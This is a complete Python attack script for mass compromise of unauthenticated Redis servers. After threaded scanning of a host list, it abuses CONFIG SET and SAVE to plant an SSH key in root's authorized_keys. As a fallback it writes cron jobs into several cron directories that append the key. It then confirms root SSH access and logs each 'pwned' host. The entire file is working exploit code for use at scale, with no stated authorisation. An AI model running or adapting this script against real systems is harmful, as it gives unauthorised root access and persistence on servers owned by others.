#!/usr/bin/env python3
"""Unauthenticated Redis -> root (staged, fast).

Stage 1  PING every host, keep unauth ones.
Stage 2  try CONFIG SET dir /root/.ssh + dbfilename authorized_keys + SAVE
Stage 3  SSH test all unauth hosts with our key
Stage 4  for survivors: cron write (debian/rhel/cron.d), wait, SSH test again

Proof = SSH login as root with our key. Nothing else is claimed.
"""
import sys, os, socket, json, time, threading, subprocess, re
from concurrent.futures import ThreadPoolExecutor, as_completed

KEYFILE = os.environ.get("KOPS_KEY_FILE", os.path.expanduser("~/.ssh/kops_vps"))
_pubf = KEYFILE + ".pub"
if os.path.exists(_pubf):
    PUB = open(_pubf).read().strip()
else:
    PUB = subprocess.check_output(["ssh-keygen", "-y", "-f", KEYFILE]).decode().strip()
T = 8

def resp(*args):
    out = b"*%d\r\n" % len(args)
    for a in args:
        if isinstance(a, str): a = a.encode()
        out += b"$%d\r\n%s\r\n" % (len(a), a)
    return out

class R:
    def __init__(self, host, port=6379, timeout=T):
        self.s = socket.create_connection((host, port), timeout=timeout)
        self.s.settimeout(timeout)
        self.buf = b""
    def cmd(self, *args):
        self.s.sendall(resp(*args)); return self.read()
    def read(self):
        while b"\r\n" not in self.buf:
            d = self.s.recv(65536)
            if not d: return None
            self.buf += d
        line, self.buf = self.buf.split(b"\r\n", 1)
        t, rest = line[:1], line[1:]
        if t == b"+": return rest.decode(errors="replace")
        if t == b"-": return "ERR:" + rest.decode(errors="replace")
        if t == b":": return int(rest)
        if t == b"$":
            n = int(rest)
            if n == -1: return None
            while len(self.buf) < n + 2:
                d = self.s.recv(65536)
                if not d: return None
                self.buf += d
            v, self.buf = self.buf[:n], self.buf[n+2:]
            return v.decode(errors="replace")
        if t == b"*":
            n = int(rest)
            return [self.read() for _ in range(n)] if n > 0 else []
        return None
    def close(self):
        try: self.s.close()
        except Exception: pass

def ssh_test(ip, timeout=8):
    try:
        p = subprocess.run(
            ["ssh", "-i", KEYFILE, "-o", "StrictHostKeyChecking=no",
             "-o", "UserKnownHostsFile=/dev/null", "-o", f"ConnectTimeout={timeout}",
             "-o", "BatchMode=yes", f"root@{ip}", "id -u; hostname"],
            capture_output=True, text=True, timeout=timeout + 6)
        out = (p.stdout or "") + (p.stderr or "")
        if re.search(r"^0\s*$", out, re.M):
            return True, out.strip().replace("\n", " ")[:120]
    except Exception:
        pass
    return False, ""

def stage1(host):
    ip, port = host.rsplit(":", 1)
    try:
        r = R(ip, int(port))
        if r.cmd("PING") != "PONG":
            r.close(); return None
        info = r.cmd("INFO", "server") or ""
        r.close()
        o = {"host": host, "ip": ip}
        m = re.search(r"redis_version:([0-9.]+)", info)
        if m: o["version"] = m.group(1)
        m = re.search(r"os:([^\r\n]+)", info)
        if m: o["os"] = m.group(1)[:60]
        m = re.search(r"process_id:(\d+)", info)
        if m: o["pid"] = m.group(1)
        return o
    except Exception:
        return None

def write_key(host):
    ip, port = host.rsplit(":", 1)
    out = {"host": host}
    try:
        r = R(ip, int(port))
        if r.cmd("PING") != "PONG":
            r.close(); return out
        r.cmd("CONFIG", "SET", "dir", "/root/.ssh")
        r.cmd("CONFIG", "SET", "dbfilename", "authorized_keys")
        r.cmd("SET", "k", "\n\n" + PUB + "\n\n")
        s = r.cmd("SAVE")
        r.close()
        out["save"] = s
    except Exception as e:
        out["err"] = str(e)[:40]
    return out

def write_cron(host):
    ip, port = host.rsplit(":", 1)
    cmd = ("* * * * * root mkdir -p /root/.ssh && echo '%s' >> /root/.ssh/authorized_keys "
           "&& chmod 700 /root/.ssh && chmod 600 /root/.ssh/authorized_keys" % PUB)
    out = {"host": host}
    try:
        r = R(ip, int(port))
        if r.cmd("PING") != "PONG":
            r.close(); return out
        for d in ("/var/spool/cron/crontabs", "/var/spool/cron", "/etc/cron.d", "/etc/cron.daily"):
            r.cmd("CONFIG", "SET", "dir", d)
            r.cmd("CONFIG", "SET", "dbfilename", "root")
            r.cmd("SET", "x", "\n\n" + cmd + "\n\n")
            r.cmd("SAVE")
        r.close()
    except Exception as e:
        out["err"] = str(e)[:40]
    return out

def main():
    path = sys.argv[1]
    hosts = [l.strip() for l in open(path) if l.strip()]
    print(f"targets={len(hosts)}", flush=True)
    t0 = time.time()
    # stage 1
    unauth = []
    with ThreadPoolExecutor(max_workers=200) as ex:
        for i, f in enumerate(as_completed([ex.submit(stage1, h) for h in hosts])):
            r = f.result()
            if r: unauth.append(r)
            if (i + 1) % 2000 == 0:
                print(f"  s1 {i+1}/{len(hosts)} unauth={len(unauth)} {time.time()-t0:.0f}s", flush=True)
    print(f"STAGE1 unauth={len(unauth)}", flush=True)
    json.dump(unauth, open("/tmp/redis_unauth.json", "w"), indent=1)
    # stage 2 key write
    with ThreadPoolExecutor(max_workers=150) as ex:
        list(ex.map(write_key, [u["host"] for u in unauth]))
    # stage 3 ssh
    pwned = []
    with ThreadPoolExecutor(max_workers=80) as ex:
        futs = {ex.submit(ssh_test, u["ip"]): u for u in unauth}
        for f in as_completed(futs):
            u = futs[f]
            ok, ev = f.result()
            if ok:
                u["PROVEN"] = "SSH_KEY"; u["evidence"] = ev
                pwned.append(u)
                json.dump(pwned, open("/tmp/redis_pwned.json", "w"), indent=1)
                print(f"🔥 {u['host']} SSH_KEY {ev}", flush=True)
    print(f"STAGE3 pwned={len(pwned)}", flush=True)
    # stage 4 cron for the rest
    rest = [u for u in unauth if u not in pwned]
    if rest:
        with ThreadPoolExecutor(max_workers=100) as ex:
            list(ex.map(write_cron, [u["host"] for u in rest]))
        time.sleep(80)
        with ThreadPoolExecutor(max_workers=80) as ex:
            futs = {ex.submit(ssh_test, u["ip"]): u for u in rest}
            for f in as_completed(futs):
                u = futs[f]
                ok, ev = f.result()
                if ok:
                    u["PROVEN"] = "CRON"; u["evidence"] = ev
                    pwned.append(u)
                    json.dump(pwned, open("/tmp/redis_pwned.json", "w"), indent=1)
                    print(f"🔥 {u['host']} CRON {ev}", flush=True)
    json.dump({"scanned": len(hosts), "unauth": unauth, "pwned": pwned},
              open("/tmp/redis_result.json", "w"), indent=1)
    print(f"\nDONE unauth={len(unauth)} PWNED={len(pwned)} in {time.time()-t0:.0f}s", flush=True)

if __name__ == "__main__":
    main()
